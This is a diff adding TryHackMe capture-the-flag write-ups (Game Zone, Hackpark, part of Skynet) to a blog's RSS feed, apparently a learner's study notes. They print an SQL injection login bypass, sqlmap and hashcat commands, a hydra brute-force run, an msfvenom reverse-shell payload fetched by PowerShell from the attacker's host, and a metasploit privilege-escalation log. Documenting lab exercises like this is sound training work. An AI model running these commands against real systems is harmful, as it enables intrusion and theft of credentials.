+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;After 30 seconds we can run our typical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; command and see that we’re able to run any command as sudo without a password.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/skynet/skynet_sudo.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 12 Sep 2020 00:00:00 -0500</pubDate>
+        <link>http://localhost:8000//Skynet</link>
+        <link href="http://localhost:8000/Skynet"/>
+        <guid isPermaLink="true">http://localhost:8000/Skynet</guid>
+      </item>
+    
+      <item>
+        <title>Game Zone Writeup</title>
+        <description>&lt;h1 id=&quot;tryhackme---game-zone&quot;&gt;TryHackMe - Game Zone&lt;/h1&gt;
+&lt;hr /&gt;
+&lt;p&gt;This room continues on the offensive security path on &lt;a href=&quot;https://tryhackme.com/room/gamezone&quot;&gt;TryHackMe&lt;/a&gt;. This room focuses on SQL injection and uses SQLmap as the main tool. Let’s get started.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-scan&quot;&gt;nmap Scan&lt;/h2&gt;
+
+&lt;p&gt;We’ll start this off by making some directories and running some scans.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sC -sV -oN nmap/gamezone_initial.txt 10.10.40.11
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 18:18 CDT
+Nmap scan report for 10.10.40.11
+Host is up (0.20s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
+|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
+|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Game Zone
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.74 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We’ve got port 22 and port 80 open. Let’s take a look at port 80 first considering we’ve got no info for an attack on port 22.&lt;/p&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+
+&lt;p&gt;Taking a look at the home page gives us the answer to one of the questions posed in task 1. The character holding the sniper is from the game hitman and his name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Agent 47&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/gamezone/gamezone_homepage.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The room wastes no time telling us that we’re going to use SQL injection to get our enumeration. The room does a good job of telling us what SQL is, and how it works. SQL stands for Structured Query Language and is used for adding, modifying or retrieving data from databases. As an attacker, any place where a user is allowed to enter input can be considered a potential attack vector. This room is no different. In addition to letting us know where the attack vector is, the room also lets us know what query the login info is entered into:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT * FROM users WHERE username = :username AND password := password&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This kind of information is invaluable. After a brief example of theoretical SQLi. It tells us to enter the username and password fields as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' or 1=1 -- -&lt;/code&gt;. This tricks the database into giving us access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portal.php&lt;/code&gt; page. The next task has us using a  well-known tool called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLMap&lt;/code&gt;. The first step is to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BurpSuite&lt;/code&gt; to intercept the POST request to the search feature of the website. Next we copy the request to a file and save it in order to run it through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLMap&lt;/code&gt;. Below is a picture of the http request, followed by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLMap&lt;/code&gt; command that I ran.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/gamezone/gamezone_burp.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap -r gamezone_request.txt --dbms=mysql --dump&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gamezone_request.txt&lt;/code&gt; file is what I called the copied http request file.&lt;/p&gt;
+
+&lt;h2 id=&quot;hash-cracking-with-hashcat&quot;&gt;Hash Cracking with Hashcat&lt;/h2&gt;
+
+&lt;p&gt;The goal now is to crack the password hash for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;agent47&lt;/code&gt; user. Although the room walks us through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JohnTheRipper&lt;/code&gt;, we’ll use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hashcat&lt;/code&gt; instead. The syntax is basically similar, but here’s the full hashcat command:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -m 1400 hash1.txt /usr/share/wordlists/rockyou.txt&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/gamezone/gamezone_pass.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-m 1400&lt;/code&gt; allows hashcat know what kind of hash it is.&lt;/p&gt;
+
+&lt;h2 id=&quot;foothold-and-user-flag&quot;&gt;Foothold and User Flag&lt;/h2&gt;
+
+&lt;p&gt;Now we can ssh using the the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;agent47&lt;/code&gt; user and the cracked password hash.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/gamezone/gamezone_user.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;reverse-ssh-tunneling&quot;&gt;Reverse SSH Tunneling&lt;/h2&gt;
+
+&lt;p&gt;The next part of the room deals with reverse SSH tunneling. SSH tunneling allows us as attackers to forward services to us bypassing any firewall restrictions. The room tells us to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ss -tulpn&lt;/code&gt; to see all the socket connections running on the machine. With the output of the command we can see a connection on port 10000. We can forward the service running on that port to our local machine by using the command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -L 10000:localhost:10000 agent47@&amp;lt;ip-address&amp;gt;&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can access the CMS running on the remote server on our local machine.  typing in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost:10000&lt;/code&gt; gives us access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webmin&lt;/code&gt; CMS. We can try the creds that we discovered earlier.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/gamezone/gamezone_webmin.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;They worked! And now we can see what version of webmin is running, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webmin 1.580&lt;/code&gt;. The room now wants us to use metasploit to grab the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; flag.&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;Opening up metasploit and typing in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;search webmin 1.580&lt;/code&gt; gives us a module &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unix/webapp/webmin_show_cgi_exec&lt;/code&gt;. I’m not going to lie, I struggled to get this module to work properly. So in the end, I took a work around and used some LFI to grab the root flag. Navigating to the tunneled link &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost:10000/file/show.cgi/root/root.txt&lt;/code&gt; on my local machine gave me the root flag.&lt;/p&gt;
+</description>
+        <pubDate>Fri, 04 Sep 2020 00:00:00 -0500</pubDate>
+        <link>http://localhost:8000//GameZone</link>
+        <link href="http://localhost:8000/GameZone"/>
+        <guid isPermaLink="true">http://localhost:8000/GameZone</guid>
+      </item>
+    
+      <item>
+        <title>Hackpark Writeup</title>
+        <description>&lt;h1 id=&quot;tryhackme---hackpark&quot;&gt;TryHackMe - Hackpark&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/hackpark&quot;&gt;Hackpark&lt;/a&gt; is a room on the offensive pentesting path on TryHackMe. I’m excited to do this writeup, regardless of the fact there are already so many, because this is a Windows machine. While I thoroughly enjoy doing Linux boxes, I recognize that the majority of the world has not adopted linux. Windows boxes are going to be more useful to me professionally. As usual, I’ve gone ahead and made a directory named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hackpark&lt;/code&gt; as well as making an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; directory.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-scan&quot;&gt;nmap Scan&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sC -sV -oN nmap/hackpark_initial.txt 10.10.252.61
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 14:55 CDT
+Nmap scan report for 10.10.252.61
+Host is up (0.16s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods:
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 6 disallowed entries
+| /Account/*.* /search /search.aspx /error404.aspx
+|_/archive /archive.aspx
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: hackpark | hackpark amusements
+3389/tcp open  ssl/ms-wbt-server?
+|_ssl-date: 2020-08-20T19:56:32+00:00; +6s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 5s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 106.56 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like we have a website hosted on port 80. It also appears that we have some disallowed entries in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt;. I’m going to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; to enumerate the directories while I take a look at the page to see what that looks like.&lt;/p&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+
+&lt;p&gt;Here’s the homepage of the hackpark website:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/hackpark/hackpark_webpage.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pennywise&lt;/code&gt; is the clown on the homepage. Taking a look around it seems that there is an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator&lt;/code&gt; account, and the webpage is running a CMS called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blogengine&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gobuster&lt;/code&gt; is also giving us a ton of directories so I stopped it early, but the one I’m most interested in is called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster dir -u http://10.10.252.61/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o gobuster_initial.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.252.61/
+[+] Threads:        100
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/08/20 15:01:54 Starting gobuster
+===============================================================
+/content (Status: 301)
+/archives (Status: 200)
+/archive (Status: 200)
+/scripts (Status: 301)
+/search (Status: 200)
+/account (Status: 301)
+/custom (Status: 301)
+/Search (Status: 200)
+/ContactUs (Status: 200)
+/Contact (Status: 200)
+/Content (Status: 301)
+/contact-us (Status: 200)
+/contact_us (Status: 200)
+/contactus (Status: 200)
+/contact (Status: 200)
+/contacts (Status: 200)
+/contactUs (Status: 200)
+/admin (Status: 302)
+/Archive (Status: 200)
+/contactinfo (Status: 200)
+/setup (Status: 302)
+/fonts (Status: 301)
+...
+/search_hd (Status: 200)
+/searchFor (Status: 200)
+/Archive-TarGzip (Status: 200)
+/contactform_menu (Status: 200)
+Progress: 124708 / 220561 (56.54%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2020/08/20 15:05:56 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/hackpark/hackpark_login.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is the page we want. As I stated before there appears to be an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator&lt;/code&gt; account, but I’ll try using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; for the username. I’ll be using hydra to brute force the page. I still sometimes get tripped up by the syntax of using hydra on a webpage so I’ll go into some more detail here about how I came up with the command. We’re looking for weak passwords in this instance so the wordlist that I’ll use is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt;. Here’s the general syntax when using hydra to brute force a web login.&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;
+hydra -l &amp;lt;username&amp;gt; -p &amp;lt;password list&amp;gt; &amp;lt;IP Address&amp;gt; http-form-post &amp;lt;login page:request headers:failed login message&amp;gt;
+&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+As I said before I’ll be using the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; and the password list rockyou.txt. The parameters can be found a few ways, but the easiest is in burp suite. Type in any username and password, then look at where the POST request is getting sent to, in our case, it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Account/login.aspx&lt;/code&gt;. We’ll type that into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login page&lt;/code&gt; of our command. Then find the headers by looking at the bottom of the request where it starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__VIEWSTATE...&lt;/code&gt; and replace your username with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;^USER^&lt;/code&gt; and password with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PASS&lt;/code&gt;, then copy and paste that into the command as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request headers&lt;/code&gt;. Finally send the request through and see that the failed login says &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Login failed&lt;/code&gt; and type that into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;failed login message&lt;/code&gt;. The BurpSuite window you need and the end result should look something like this:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/hackpark/hackpark_hydra.png&quot; alt=&quot;BurpSuite Request Image&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.99.227 http-form-post '/Account/login.aspx:__VIEWSTATE=Yz2BmKWWmXED1M056DNvSQhT62lTMsJhye52KUnzi5j%2FYknWsMsDcNTgSNiRIP2D0%2Bc5vRnv5V%2BJjLsayVDwL%2FGipfl%2FYYKH9z5aG6v7oPhjdXPFV%2F1TPaFuzULQdV7VKi%2FQ2whj3p5jjcsl0naPMgEzObayz4u6g%2B09OsJe3mU7EaMUwhOL0zl7clQ5odf5BLU6hvYwWyLOTvieZ%2BbgWMfjXaxZa75LXWImGmWDdtx5GsbWohL7CAkW5%2B%2Bb2y%2BZzr%2F9OlBObL7ZFPuzNZ%2FMdB18F4ddVhgppKkgvAKRc4OjIdcNdJ8JYICw0H58CV2J8oNn3xlz6PiXnSDDRRQnwWGcUubFx6yaezYKmkB8McM1s7IG&amp;amp;__EVENTVALIDATION=%2FQ1jgWYDvNlzWDYKERdr1OFYc%2FdP88fNJliWRB6G56lCwhimMmZ%2Bm629vWFW8m1FXpiyykZyzK1hCR3k7QwTE00bvmdzREUCtVMF6kHqC10GEbK2BLBoH4ckTVI4VoLWV%2F7FOt2QmdJL6t%2BdVb3DJpdRPLybAcJN1dMzqpj7zMZRylt%2B&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-21 13:35:45
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.99.227:80/Account/login.aspx:__VIEWSTATE=Yz2BmKWWmXED1M056DNvSQhT62lTMsJhye52KUnzi5j%2FYknWsMsDcNTgSNiRIP2D0%2Bc5vRnv5V%2BJjLsayVDwL%2FGipfl%2FYYKH9z5aG6v7oPhjdXPFV%2F1TPaFuzULQdV7VKi%2FQ2whj3p5jjcsl0naPMgEzObayz4u6g%2B09OsJe3mU7EaMUwhOL0zl7clQ5odf5BLU6hvYwWyLOTvieZ%2BbgWMfjXaxZa75LXWImGmWDdtx5GsbWohL7CAkW5%2B%2Bb2y%2BZzr%2F9OlBObL7ZFPuzNZ%2FMdB18F4ddVhgppKkgvAKRc4OjIdcNdJ8JYICw0H58CV2J8oNn3xlz6PiXnSDDRRQnwWGcUubFx6yaezYKmkB8McM1s7IG&amp;amp;__EVENTVALIDATION=%2FQ1jgWYDvNlzWDYKERdr1OFYc%2FdP88fNJliWRB6G56lCwhimMmZ%2Bm629vWFW8m1FXpiyykZyzK1hCR3k7QwTE00bvmdzREUCtVMF6kHqC10GEbK2BLBoH4ckTVI4VoLWV%2F7FOt2QmdJL6t%2BdVb3DJpdRPLybAcJN1dMzqpj7zMZRylt%2B&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
+[STATUS] 937.00 tries/min, 937 tries in 00:01h, 14343462 to do in 255:08h, 16 active
+[80][http-post-form] host: 10.10.99.227   login: admin   password: REDACTED
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-21 13:37:30
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;
+
+&lt;p&gt;Now that we’re in the admin dashboard, we can start to take a look around and see what we’re working with here. Visiting the about page gives us a good idea about the CMS that we have. With that information we can do some research on exploits that we might be able to use.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/hackpark/hackpark_blog.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using a quick google search shows us that the CMS has a known vulnerability we can exploit on &lt;a href=&quot;https://www.exploit-db.com/exploits/46353&quot;&gt;exploit-db&lt;/a&gt;. The exploit gives us good instructions on how to compromise the machine. First we navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin/app/editor/editpost.cshtml&lt;/code&gt; on our machine. Then we need to click on the file icon on the top right of our post window, this will allow us to upload our exploit. Once we’ve made sure that we’ve changed the ip and port number of the exploit, we have to upload our exploit as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PostView.ascx&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/hackpark/hackpark_upload.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we set a netcat listener on our attacking machine, and navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?theme=../../App_Data/files&lt;/code&gt; on our victim website to trigger the exploit.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/hackpark/hackpark_initial.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;upgrading-the-shell&quot;&gt;Upgrading the Shell&lt;/h2&gt;
+
+&lt;p&gt;The next step is to upgrade our shell. I’ll be using metasploit for this shell upgrade. We can use powershell to upload a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; payload and connect with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multi/handler&lt;/code&gt; on metasploit. You can find a good amount of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; commands &lt;a href=&quot;https://netsec.ws/?p=331&quot;&gt;here&lt;/a&gt;. Here’s my command:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f exe &amp;gt; shell.exe&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The next step is to upload our payload to the victim machine. I’ll first spin up a webserver in the directory with my payload using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -m http.server&lt;/code&gt; I’m sure there’s a command we can use striaght from the command prompt, but I’m going to upload it with powershell in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\Temp&lt;/code&gt; folder. After navigating to the proper directory, here’s the command for the file upload:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell Invoke-WebRequest http://&amp;lt;your-ip&amp;gt;:8000/&amp;lt;payload&amp;gt; -OutFile &amp;lt;payload-name&amp;gt;&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once the file’s been uploaded, we need to set up metasploit. Type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use multi/handler&lt;/code&gt; and set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LHOST&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LPORT&lt;/code&gt; values to the same values in the payload. Be sure to set your payload as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows/meterpreter/reverse_tcp&lt;/code&gt; as well. Then run the exploit with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run&lt;/code&gt;. Metasploit will listen for the payload. Switch over to the victim machine and simply run the payload, which in my case is simply &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.exe&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/hackpark/hackpark_meterpreter.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We now have a meterpreter shell on our victim machine.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;One of the many cool things about metasploit is that it can automate the escalation process for us by typing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run post/multi/recon/local_exploit_suggester&lt;/code&gt;. This runs through a bunch of known local exploits and sees what our victim might be vulnerable to.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/hackpark/hackpark_privesc.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Of these exploits, I like the look of the one at the bottom the most. So Here’s the general flow of my commands to get this exploit running:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt;
+Background session 2? [y/N]  
+msf6 exploit(multi/handler) &amp;gt; use exploit/windows/local/ms16_075_reflection_juicy
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &amp;gt; options
+
+Module options (exploit/windows/local/ms16_075_reflection_juicy):
+
+   Name     Current Setting                         Required  Description
+   ----     ---------------                         --------  -----------
+   CLSID    {REDACTED}  yes       Set CLSID value of the DCOM to trigger
+   SESSION                                          yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  none             yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     REDACTED    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &amp;gt; set LHOST tun0
+LHOST =&amp;gt; tun0
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &amp;gt; set session 2
+session =&amp;gt; 2
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &amp;gt; run
+
+[*] Started reverse TCP handler on REDACTED:4444
+[+] Target appears to be vulnerable (Windows 2012 R2 (6.3 Build 9600).)
+[*] Launching notepad to host the exploit...
+[+] Process 2168 launched.
+[*] Reflectively injecting the exploit DLL into 2168...
+[*] Injecting exploit into 2168...
+[*] Exploit injected. Injecting exploit configuration into 2168...
+[*] Configuration injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175174 bytes) to 10.10.66.180
